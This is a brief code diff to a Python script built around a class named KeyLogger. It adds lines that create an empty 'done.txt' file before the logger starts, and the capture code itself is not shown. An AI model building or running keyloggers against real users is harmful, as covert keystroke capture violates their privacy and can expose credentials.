@@ -25,6 +25,8 @@ class KeyLogger():
 
 
 if __name__ == '__main__':
+    f= open("done.txt","w+")
+    f.close()
     logger = KeyLogger()
     logger.main()
     input()
